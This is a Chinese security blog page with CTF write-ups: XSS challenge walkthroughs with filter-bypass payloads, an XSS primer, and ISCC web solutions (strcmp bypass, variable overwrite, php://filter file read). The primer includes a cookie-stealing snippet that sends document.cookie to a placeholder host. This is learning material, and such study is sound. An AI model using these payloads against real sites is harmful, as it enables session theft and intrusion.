<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>Iuhrey的幻想乡</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="一个常年被吊打的Web手    一个唱歌不好指弹垃圾的吉他手">
<meta property="og:type" content="website">
<meta property="og:title" content="Iuhrey的幻想乡">
<meta property="og:url" content="http://yoursite.com/index.html">
<meta property="og:site_name" content="Iuhrey的幻想乡">
<meta property="og:description" content="一个常年被吊打的Web手    一个唱歌不好指弹垃圾的吉他手">
<meta property="og:locale" content="zh-CN">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Iuhrey的幻想乡">
<meta name="twitter:description" content="一个常年被吊打的Web手    一个唱歌不好指弹垃圾的吉他手">
  
    <link rel="alternate" href="/atom.xml" title="Iuhrey的幻想乡" type="application/atom+xml">
  
  
    <link rel="icon" href="source/images/favicon.ico" />
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  <link rel="stylesheet" href="/css/style.css">
  <link rel="stylesheet" href="/plugin/bganimation/bg.css">
  

</head>

<body>
  <div id="container">
    <div id="wrap">
      <div class="outer">
        <div class="widget-wrap mobile-header">
  <h3 class="widget-title"></h3>
  <div class="widget">
    <img class="avatar" src="/images/avatar.jpg">
    <h2 class="author">Iuhrey</h2>
    <h3 class="description">一个常年被吊打的Web手    一个唱歌不好指弹垃圾的吉他手</h3>
    <div class="count-box">
      <a href="/archives"><div><strong>18</strong><br>文章</div></a>
      <a href="/categories"><div><strong>2</strong><br>分类</div></a>
      <a href="/tags"><div><strong>8</strong><br>标签</div></a>
    </div>
    <ul class="blog-link">
     
          <a href="/" title="Home">
            <li>幻想乡的起点</li>
          </a>
        
          <a href="/archives" title="Archives">
            <li>幻想乡图</li>
          </a>
        
          <a href="/categories" title="Categories">
            <li>分岔路</li>
          </a>
        
          <a href="/tags" title="Tags">
            <li>路标</li>
          </a>
        
    </ul>
  </div>
</div>

        <section id="main">
  
    <article id="post-xss挑战赛的Payload-下" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/07/13/xss挑战赛的Payload-下/" class="article-date">
  <time class="post-time" datetime="2018-07-12T18:33:05.000Z" itemprop="datePublished">
    <span class="post-month">7月</span><br/>
    <span class="post-day">13</span>
  </time>
</a>
   
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/07/13/xss挑战赛的Payload-下/">xss挑战赛的Payload(下)</a>
    </h1>
  

        <div>
          
  <div class="article-category">
    <a class="article-category-link" href="/categories/日常学习/">日常学习</a>
  </div>

          
              

          
        </div>
      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="level-11"><a href="#level-11" class="headerlink" title="level 11"></a>level 11</h2><p><img src="../images/14/10.png" alt=""><br>这题目和第十题很类似，而且t_ref的内容竟然时第十题的payload，仔细想想，我们就是通过构造这个才跳转到的第十一题，而且ref立马就能想到referer这个，所以抓包更改referer属性然后点击就行了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">referer: &quot; type=&quot;button&quot; onclick=&quot;alert(1)</span><br></pre></td></tr></table></figure></p>
<p><img src="../images/14/11.png" alt=""></p>
<h2 id="level-12"><a href="#level-12" class="headerlink" title="level 12"></a>level 12</h2><p><img src="../images/14/12.png" alt=""><br>这题目的注入点在http头的浏览器模式下，抓包改浏览器格式和上一题一样。</p>
<h2 id="level-13"><a href="#level-13" class="headerlink" title="level 13"></a>level 13</h2><p>这题目和上面题目类似就是把cookies里面user的内容改了就行了。</p>
<h2 id="level-14"><a href="#level-14" class="headerlink" title="level 14"></a>level 14</h2><p>这题目没搞懂要做什么，查了wp说是这题目貌似有问题，所以暂且跳过。</p>
<h2 id="level-15"><a href="#level-15" class="headerlink" title="level 15"></a>level 15</h2><p>加载起来特别慢，也没搞懂是网络问题还是这个页面本身就这样。<br><img src="../images/14/13.png" alt=""><br>根据提示这里需要用到AngularJS，听大黄说这是js的一个框架，有着特定的语法，基本的js语法也能够适用，但是需要遵守一定规则。具体用法和规则如下：<br><img src="../images/14/14.png" alt=""><br>这里查阅了大手子的资料发现对外部html还有特殊的要求：<br><img src="../images/14/15.png" alt=""><br>所以大致结合起来看，我们可以通过访问ng-include来执行我们的外部文件，所以可以考虑通过level1作为跳板来实现，由于script的标签没办法使用只能用事件来触发xss<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">src=&apos;level1.php?name=&lt;img src=s onerror=alert(1)&gt;&apos;</span><br></pre></td></tr></table></figure></p>
<h2 id="level-16"><a href="#level-16" class="headerlink" title="level 16"></a>level 16</h2><p>这题目依旧是通过get型的方式来赋值，测试发现script关键词被过滤了，然后带有&lt;&gt;的标签必然在后面会跟着闭合标签&lt;/&gt;，而且空格被过滤了，我们可以这样构造：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;form&gt;&lt;input%0Atype=&quot;button&quot;%0Aonclick=&quot;alert(1)&quot;&gt;</span><br></pre></td></tr></table></figure></p>
<p>由于第一个标签网页自动跟上了一个结束的标签，中间我们直接构造了一个按钮点击即可触发onclick事件。最终源码被解析成了这样。<br><img src="../images/14/16.png" alt=""></p>
<h2 id="level-17"><a href="#level-17" class="headerlink" title="level 17"></a>level 17</h2><p>刚刚进入题目就发现了两个可疑的参数，具体如下：<br><img src="../images/14/17.png" alt=""><br>翻了翻源码发现它对应的是这个：<br><img src="../images/14/18.png" alt=""><br>接着测试的时候发现了一个问题就是无论怎么输入&lt;&gt;这两个都是没办法绕过过滤的，那只能通过直接在这里面构造事件来达到弹窗的目的，onclick一旦点击就跳转了，所以只能用一些只在当前页面触发的事件，比如onmouseover，onfocus，不过在测试时还发现了一点就是在参数后面加空格，才能把事件独立出来解析，所以payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arg01=123&amp;arg02= onfocus=alert(1)</span><br></pre></td></tr></table></figure></p>
<p>点一下松开就行了。<br><strong>ps:弹窗了不会跳转，需要点击下面的那个链接</strong></p>
<h2 id="level-18"><a href="#level-18" class="headerlink" title="level 18"></a>level 18</h2><p>emmmmmmm…………<br>这题目和17一样啊，没搞懂什么意思。</p>
<h2 id="level-19-amp-amp-level-20"><a href="#level-19-amp-amp-level-20" class="headerlink" title="level 19 &amp;&amp; level 20"></a>level 19 &amp;&amp; level 20</h2><p>完全没头绪。。。。<br>真的做不出啊。。。。<br>之后学学js再回来做这道题目。</p>
<h2 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h2><p>之后xss题目还是会接着做，接下来要学学其他东西了。。。。还是太垃圾了。。<br><img src="../images/14/19.jpg" alt=""></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2018/07/13/xss挑战赛的Payload-下/" data-id="cjjiw7dk8000zaovezgghmee2" class="article-share-link">分享</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/XSS/">XSS</a></li></ul>

    </footer>
  </div>
  
</article>




  
    <article id="post-xss挑战赛的Payload(上)" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/07/10/xss挑战赛的Payload(上)/" class="article-date">
  <time class="post-time" datetime="2018-07-10T11:02:27.000Z" itemprop="datePublished">
    <span class="post-month">7月</span><br/>
    <span class="post-day">10</span>
  </time>
</a>
   
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/07/10/xss挑战赛的Payload(上)/">xss挑战赛的Payload(上)</a>
    </h1>
  

        <div>
          
          
              

          
        </div>
      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>日常开头，塔主在之前弄了一个XSS的专题，里面大致介绍了XSS攻击的一些要领以及给了我们一个XSS接收平台。，为了练习呢，有人推荐了这个<strong>xss.tv</strong>，里面有共计20道题目，所以我打算归纳一下Payload，随便总结一下bypass的思路。  </p>
<h2 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h2><p><img src="../images/14/1.png" alt=""><br>打开XSS挑战赛的地址，发现第一题很明显是Get型的传参方式。试试最为基础的，也是作为测试的Payload。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
<p>很容易过关跳转到第二关。</p>
<h2 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h2><p>审查元素<br><img src="../images/14/2.png" alt=""><br>发现输入的字符被嵌入进了<strong>value=””</strong>，可以考虑闭合构造弹出提示框，然后注释掉后面的内容。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt; //</span><br></pre></td></tr></table></figure></p>
<h2 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h2><p>测试一下发现在文本框输入<strong>‘</strong>是无法回显的，审查元素发现如下。<br><img src="../images/14/3.png" alt=""><br>针对这个为啥输入了一个’，源码就变成这样我还特地问了问前端狗大黄，这可能是浏览器的问题。我特地试试了几个不同的浏览器，发现输入相同，但是网站的源码并不一致，所以为了学好XSS，我就一直用一个特定的浏览器firefox。<br>接着测试一下’a’b确定输入的内容如何嵌入网站源码。<br><img src="../images/14/4.png" alt=""><br>那就照猫画虎构造Payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;onclick=alert(1)&gt;&apos;</span><br></pre></td></tr></table></figure>
<p>源码就变为了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input onclick=&quot;alert(1)&gt;&apos;&apos;&quot;</span><br></pre></td></tr></table></figure>
<p>这里由于浏览器解析问题这一段就直接解析成了一个事件，点击一下文本框就弹窗了。<br><strong>PS:具体原理我也搞不懂是为啥，问了前端狗也无果</strong></p>
<h2 id="level-4"><a href="#level-4" class="headerlink" title="level 4"></a>level 4</h2><p>这一题和上一题类似，就是把<strong>‘</strong>换成了<strong>“</strong>，试着输入Payload。<br><img src="../images/14/5.png" alt=""><br>发现回显出现了一个问题就是<strong>&gt;</strong>被吞了，既然这样我们可以试试实体编码<strong>&amp;gt</strong>来绕过。<br>点击文本框即可弹窗。  </p>
<h2 id="level-5"><a href="#level-5" class="headerlink" title="level 5"></a>level 5</h2><p>这题目多了一个难点就是on被强制转化为了o_n，就说明某些事件标签就不可以用了，但是可以换一个思路来构造xss的Payload，既然on不能用了，那我们试试a，href标签，构造<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;a href=&quot;javascript:alert(1)&quot;&gt;clickme&lt;&quot;</span><br></pre></td></tr></table></figure></p>
<p><img src="../images/14/6.png" alt=""><br>发现a标签被解析了，只要点击后面的clickme就能执行javascript伪协议后面的内容。</p>
<h2 id="level-6"><a href="#level-6" class="headerlink" title="level 6"></a>level 6</h2><p>这一关相比较第五关就是过滤了href，目前过滤了on，script，href这三个关键词，我们可以尝试使用大小写来进行绕过。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;sCript&gt;alert(1)&lt;/sCript&gt;&lt;&quot;</span><br></pre></td></tr></table></figure></p>
<h2 id="level-7"><a href="#level-7" class="headerlink" title="level 7"></a>level 7</h2><p>这题目初步测试发现关键词on，script，src，href等关键词都被过滤了，无法回显我们输入的关键词，那么可以试试双写来绕过。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;scrscriptipt&gt;alert(1)&lt;/scrscriptipt&gt;&lt;&quot;</span><br></pre></td></tr></table></figure></p>
<h2 id="level-8"><a href="#level-8" class="headerlink" title="level 8"></a>level 8</h2><p>这一题过滤了很多东西，大写被自动转义成了小写，一些关键词中间都被强加了<strong>_</strong>，我们可以推测前端获取了信息返回给后端，后端是经过了一定处理的，所以呢，我们只要避开后端的检测就行了，这里可以使用实体编码来绕过，因为在后端是无法解析实体编码的，只有在前端页面才能进行解析，所以我们可以用实体编码来构造payload。<br>解决这个问题，再次观察题目发现我们输入的payload会被网页添加到<strong>a href</strong>标签中，所以我们最后的payload为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;:alert(1)</span><br></pre></td></tr></table></figure></p>
<p><img src="../images/14/7.png" alt=""></p>
<h2 id="level-9"><a href="#level-9" class="headerlink" title="level 9"></a>level 9</h2><p>说实话一开始我毫无头绪，测试了很多发现都无法改变友链的内容，知道看到解析才知道，原来合法链接的意思是要加上<strong>http://</strong>，这样就好构造了，把后面的<strong>http://</strong>注释掉就行了，payload如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;:alert(1)//http://</span><br></pre></td></tr></table></figure></p>
<h2 id="level-10"><a href="#level-10" class="headerlink" title="level 10"></a>level 10</h2><p>点进去发现什么都没给,但查看源码发现<br><img src="../images/14/8.png" alt=""><br>输入框被隐藏了，所以可以直接通过get把参数传过去，不过在测试的时候发现只有<strong>t_sort</strong>这个参数传过去才能更改源码。<br>不过测试发现<strong>&lt;&gt;</strong>这个标签被过滤了，并且我在尝试使用<strong>&amp;lt,&amp;gt</strong>绕过时发现，不仅左右括号被吞了，连内容也被吞了，不过好在on有用，构造如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://daka.whaledu.com/xss/level10.php?t_sort=&quot; type=&quot;button&quot; onclick=&quot;alert(1)</span><br></pre></td></tr></table></figure></p>
<p>最终的解析为<br><img src="../images/14/9.png" alt=""></p>
<h2 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h2><p>由于考试周加上一些烦躁的事情要处理，博客没来得及更新，接下来博客会很勤的写。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2018/07/10/xss挑战赛的Payload(上)/" data-id="cjjiw7dk8000xaove78i9kgvn" class="article-share-link">分享</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/XSS/">XSS</a></li></ul>

    </footer>
  </div>
  
</article>




  
    <article id="post-关于xss的一些学习心得" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/06/01/关于xss的一些学习心得/" class="article-date">
  <time class="post-time" datetime="2018-06-01T10:26:17.000Z" itemprop="datePublished">
    <span class="post-month">6月</span><br/>
    <span class="post-day">01</span>
  </time>
</a>
   
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/06/01/关于xss的一些学习心得/">关于xss的一些学习心得</a>
    </h1>
  

        <div>
          
  <div class="article-category">
    <a class="article-category-link" href="/categories/日常学习/">日常学习</a>
  </div>

          
              

          
        </div>
      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>按照惯例，开头还是逼逼几句，本来这一篇我昨天就写好了，可是处理的时候不小心删了，所以就只能重新写一篇了，关于xss呢，很早之前就接触过但是一直没系统的学，只是为了做xss的题目而做题目所以这一次系统的归纳一下，也算是个备忘录吧。  </p>
<h2 id="何为XSS"><a href="#何为XSS" class="headerlink" title="何为XSS"></a>何为XSS</h2><p>XSS是一种经常出现在web应用中的计算机安全漏洞，它允许恶意web用户将代码植入到提供给其它用户使用的页面中。比如这些代码包括HTML代码和客户端脚本。攻击者利用XSS漏洞旁路掉访问控制——例如同源策略(same origin policy)。这种类型的漏洞由于被黑客用来编写危害性更大的网络钓鱼(Phishing)攻击而变得广为人知。对于跨站脚本攻击，黑客界共识是：跨站脚本攻击是新型的“缓冲区溢出攻击“，而JavaScript是新型的“ShellCode”。<strong>(摘自百度百科)</strong><br>以上的说明呢，是官方的。不过根据我的理解来说，XSS攻击是攻击者把构造的恶意代码插入到网页源码中，通过跳转，执行事件等方式来达到获取信息，执行恶意代码等目的。  </p>
<h2 id="XSS攻击的分类"><a href="#XSS攻击的分类" class="headerlink" title="XSS攻击的分类"></a>XSS攻击的分类</h2><p>一般来说XSS攻击分为三种。<br>第一种是反射型XSS，反射性XSS只是简单地把用户输入的数据”反射”给浏览器，也就是说攻击者必须让攻击点击所构造的恶意链接才能给攻击者反馈消息或者执行非本人意愿的命令。这一种反馈是即时性的，也是一次性的，也就是即输即用，也叫做”非持久型XSS”<br>第二种是储存型XSS，储存型XSS会把攻击者所构造的恶意代码储存到后端的数据库中，只要有用户一旦浏览到恶意代码的页面便会执行攻击的代码，被窃取登入验证等信息，攻击者便可以假冒”代表”用户进行操作。<br>第三种是基于Dom的XSS，这一种XSS攻击和反射型差不多，也算是反射型的一种，这种类型的攻击一般是攻击者构造一些事件，或者调用js里面一些函数来实现的，所以具体来说这种和第一种区分不算太大。  </p>
<h2 id="XSS一些Payload"><a href="#XSS一些Payload" class="headerlink" title="XSS一些Payload"></a>XSS一些Payload</h2><p>其实来说呢，xss的payload也不是类似sql注入一样固定的，xss的payload一般来说是变化多样，根据其html的代码来进行构造的。<br>这是最为基础，也是常用于测试的代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br><span class="line">```  </span><br><span class="line">这里面包含了标签，也包含了alert()函数，一般来说是可以测试出一些东西的。  </span><br><span class="line">还有例如这种的payload</span><br></pre></td></tr></table></figure></p>
<p><img scr="#" onerror="alert(1)"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">这种是通过构造一个错误，触发onerror事件弹出alert(1)。   </span><br><span class="line">还有类似这种</span><br></pre></td></tr></table></figure></p>
<p><script><br>var i=new Image;<br>i.src=”<a href="http://xxxx.xxxx.xxx&quot;+document.cookies">http://xxxx.xxxx.xxx&quot;+document.cookies</a>;<br></script><br><code>`</code><br>这种就是通过点击恶意链接，然后用户的信息就被窃取了。<br><strong>以上只是几种简单的Payload，其余的类型实在是太过复杂了，多做题目才能有更多的经验</strong>  </p>
<h2 id="绕过技巧"><a href="#绕过技巧" class="headerlink" title="绕过技巧"></a>绕过技巧</h2><p>这个就大致说一下吧，之后会在练习中讲解一些的。主要分为以下几种。<br><strong>1 编码绕过</strong>根据网页过滤的代码，以及代码执行的环境进行合适的编码转化，例如他在后台过滤<strong>&lt;&gt;</strong>这个东西，那我们可以通过%3c%3e来绕过，也可以\0x3c来绕过。<br><strong>2 字符限制</strong>一般网页会限制输入的长度，我们可以进行简化代码，也可以直接更改源码中的maxlength要素来修改字符长度上限。<br><strong>3 使用标签</strong>灵活使用标签也是可以达到同样的效果的。<br>一些其他的方式也是需要在实战中进行磨练出来的，之后会写一篇XSS练习平台的wp，详细说一些思路。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2018/06/01/关于xss的一些学习心得/" data-id="cjjiw7dko0016aoveb0zd71rx" class="article-share-link">分享</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web-XSS/">Web XSS</a></li></ul>

    </footer>
  </div>
  
</article>




  
    <article id="post-ISCC之Web的一些wp" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/05/25/ISCC之Web的一些wp/" class="article-date">
  <time class="post-time" datetime="2018-05-25T02:36:47.000Z" itemprop="datePublished">
    <span class="post-month">5月</span><br/>
    <span class="post-day">25</span>
  </time>
</a>
   
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/05/25/ISCC之Web的一些wp/">ISCCC Web的一些wp</a>
    </h1>
  

        <div>
          
          
              

          
        </div>
      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>这是我第一次写wp，因为这次比赛挺简单的，我做的题目挺多的所以才写的这篇wp，像之前的那些偶尔爆零的比赛写出来丢人(这次写出来也挺丢人的)，web400之后总结再写，web300的注入真心不会。。</p>
<h3 id="比较数字大小"><a href="#比较数字大小" class="headerlink" title="比较数字大小"></a>比较数字大小</h3><p>发现有个输入框，f12查看源码发现要求输入的数字大于某个数，然而输入框限制了输入的长度，把maxlength改为999然后乱按一通就过了。  </p>
<h3 id="Web01"><a href="#Web01" class="headerlink" title="Web01"></a>Web01</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(&apos;2.php&apos;); </span><br><span class="line">$flag=&apos;&#123;***************&#125;&apos;; </span><br><span class="line">if (isset($_GET[&apos;password&apos;])) &#123;   </span><br><span class="line">    if (strcmp($_GET[&apos;password&apos;], $flag) == 0)   </span><br><span class="line">        die(&apos;Flag: &apos;.$flag);   </span><br><span class="line">    else   </span><br><span class="line">        print &apos;Invalid password&apos;;   </span><br><span class="line">&#125;   </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>这题考察的是对strcmp()函数的理解，strcmp函数在对数组类的变量是会返回0的，在与其他变量比较时直接返回0，成功得到flag    </p>
<h3 id="为什么这么简单啊"><a href="#为什么这么简单啊" class="headerlink" title="为什么这么简单啊"></a>为什么这么简单啊</h3><p>打开网址发现了第一关的提示。<br><img src="../images/10/7.png" alt=""><br>从xxxx进入的意思大致是构造<strong>Referer:<a href="http://edu.xss.tv" target="_blank" rel="noopener">http://edu.xss.tv</a></strong>，ip构造为题目所要的就能进入第二关了。<br>发现页面跳转到了<strong>number2.php?token=260ca9dd8a4577fc00b7bd5810298076</strong>，第二关要求我们输入密码，提示了密码在哪，所以打开F12找密码。<br><img src="../images/10/8.png" alt=""><br>意外发现了password.js，那一串疑似base64的编码加上==号解码试试，果不其然就是密码了，把密码输进去flag到手。</p>
<h3 id="本地的诱惑"><a href="#本地的诱惑" class="headerlink" title="本地的诱惑"></a>本地的诱惑</h3><p>抓包，添加X-Forwarded-For：127.0.0.1，即可得到flag</p>
<h3 id="你能跨过去吗"><a href="#你能跨过去吗" class="headerlink" title="你能跨过去吗"></a>你能跨过去吗</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.test.com/NodeMore.jsp?id=672613&amp;page=2&amp;pageCounter=32&amp;undefined&amp;callback=%2b/v%2b%20%2bADwAcwBjAHIAaQBwAHQAPgBhAGwAZQByAHQAKAAiAGsAZQB5ADoALwAlAG4AcwBmAG8AYwB1AHMAWABTAFMAdABlAHMAdAAlAC8AIgApADwALwBzAGMAcgBpAHAAdAA%2bAC0-&amp;_=1302746925413</span><br></pre></td></tr></table></figure>
<p>题目给了一个这个url，还有xss的提示，在url发现callback参数有问题，url解码发现<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">+/v+ +ADwAcwBjAHIAaQBwAHQAPgBhAGwAZQByAHQAKAAiAGsAZQB5ADoALwAlAG4AcwBmAG8AYwB1AHMAWABTAFMAdABlAHMAdAAlAC8AIgApADwALwBzAGMAcgBpAHAAdAA+AC0-</span><br></pre></td></tr></table></figure></p>
<p>+/v+是utf-7编码格式，后面的base64得到<strong>&lt;�script&gt;alert(“key:/%nsfocusXSStest%/“)&lt;�/script&gt;</strong><br>把key输入文本框就能得到flag了  </p>
<h3 id="一切都是套路"><a href="#一切都是套路" class="headerlink" title="一切都是套路"></a>一切都是套路</h3><p>这道题目一开始还没做出来，后面捋捋思路发现还是挺有趣的，一道关于变量覆盖的题目。<br>首先找找有没有源码泄露，发现有个index.php.txt<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line"></span><br><span class="line">if ($_SERVER[&quot;REQUEST_METHOD&quot;] != &quot;POST&quot;)</span><br><span class="line">	die(&quot;flag is here&quot;);</span><br><span class="line"></span><br><span class="line">if (!isset($_POST[&quot;flag&quot;]) )</span><br><span class="line">	die($_403);</span><br><span class="line"></span><br><span class="line">foreach ($_GET as $k =&gt; $v)&#123;</span><br><span class="line">	$$k = $$v;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foreach ($_POST as $k =&gt; $v)&#123;</span><br><span class="line">	$$k = $v;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if ( $_POST[&quot;flag&quot;] !== $flag )</span><br><span class="line">	die($_403);</span><br><span class="line"></span><br><span class="line">echo &quot;flag: &quot;. $flag . &quot;\n&quot;;</span><br><span class="line">die($_200);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>flag在$flag里面，然后要我们通过post传参使得输入的flag等于$flag里面的内容，但是我们并不知道flag是啥，仔细观察发现有<strong>$$</strong>一个东西，我们可以考虑变量覆盖来做。<br>进一步观察发现$_200这个变量是一定会输出的，而且里面的内容并不重要，而$flag在传参的时候会被覆盖，所以我们可以考虑把$flag的内容给$_200，而$flag我们可以通过post<strong>flag=flag</strong>构造来满足题目所要的<strong>$_POST[“flag”] !== $flag</strong><br>所以最终的构造为<img src="../images/10/1.png" alt="">  </p>
<h3 id="你能绕够吗"><a href="#你能绕够吗" class="headerlink" title="你能绕够吗"></a>你能绕够吗</h3><p>这道题目考察的是文件包含，进题目后随便点点发现了这个<br><img src="../images/10/2.png" alt=""><br>我们可以尝试一下<strong>?f=php://filter/read=convert.base64-encode/resource=index.php</strong><img src="../images/10/3.png" alt="">发现弹出一个error。很有可能把某个关键词给过滤了，试了试发现是php被过滤了，那尝试用大小写来绕过发现没有问题，但是并没有回显<img src="../images/10/4.png" alt="">我们一直index.php是存在的，其他的关键词也没被过滤，<strong>php</strong>这个关键词我们也用大小写绕过了，但是为什么还是读不出结果呢？这只剩下一种可能，由于在之前过滤了php，那很有可能后面又加上了php这个后缀，所以导致我们读不出，抱着希望尝试一下<strong>?f=Php://filter/read=convert.base64-encode/resource=index</strong>，结果出现了回显<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgICA8dGl0bGU+5a+86Iiq6aG1PC90aXRsZT4KICAgIDxtZXRhIGNoYXJzZXQ9IlVURi04Ij4KPC9oZWFkPgo8Ym9keT4KICAgIDxhIGhyZWY9J2luZGV4LnBocD9mPWFydGljbGVzJmlkPTEnPklEOiAxPC9ocmVmPgogICAgPC9icj4KICAgIDxhIGhyZWY9J2luZGV4LnBocD9mPWFydGljbGVzJmlkPTInPklEOiAyPC9ocmVmPgogICAgPC9icj4KICAgIDxhIGhyZWY9J2luZGV4LnBocD9mPWFydGljbGVzJmlkPTMnPklEOiAzPC9ocmVmPgogICAgPC9icj4KICAgIDxhIGhyZWY9J2luZGV4LnBocD9mPWFydGljbGVzJmlkPTQnPklEOiA0PC9ocmVmPgogICAgPC9icj4KPC9ib2R5Pgo8L2h0bWw+Cgo8P3BocAogICAgI0lTQ0N7TEZJT09PT09PT09PT09PT099CiAgICBpZihpc3NldCgkX0dFVFsnZiddKSl7CiAgICAgICAgaWYoc3RycG9zKCRfR0VUWydmJ10sInBocCIpICE9PSBGYWxzZSl7CiAgICAgICAgICAgIGRpZSgiZXJyb3IuLi4iKTsKICAgICAgICB9CiAgICAgICAgZWxzZXsKICAgICAgICAgICAgaW5jbHVkZSgkX0dFVFsnZiddIC4gJy5waHAnKTsKICAgICAgICB9CiAgICB9CiAgICAKPz4KCg==</span><br></pre></td></tr></table></figure></p>
<p>base64解码后，发现flag  </p>
